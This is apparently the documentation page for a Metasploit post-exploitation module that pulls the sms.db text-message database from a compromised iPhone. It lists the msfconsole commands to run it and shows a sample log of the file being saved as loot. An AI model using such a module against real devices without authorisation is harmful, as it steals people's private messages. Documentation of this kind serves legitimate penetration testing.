## Description
  
  This module downloads the `sms.db` file from iPhones

## Verification Steps

  1. Start msfconsole
  2. Get a session
  3. Do: ```use post/apple_ios/gather/ios_text_gather```
  4. Do: ```set SESSION <session>```
  5. Do: ```run```
  6. You should get the sms.db file on the iPhone target

## Scenarios

### Tested on iOS 10.3.3 on an iPhone 5

  ```

  msf5 > use post/apple_ios/gather/ios_text_gather
  msf5 post(apple_ios/gather/ios_text_gather) > set session 1
  session => 1
  msf5 post(apple_ios/gather/ios_text_gather) > run

  [!] SESSION may not be compatible with this module.
  [+] sms.db file found
  [+] sms.db stored at /Users/space/.msf4/loot/20181101154200_default_192.168.43.49_sms.db.file_591456.txt
  [*] Post module execution completed


  ```
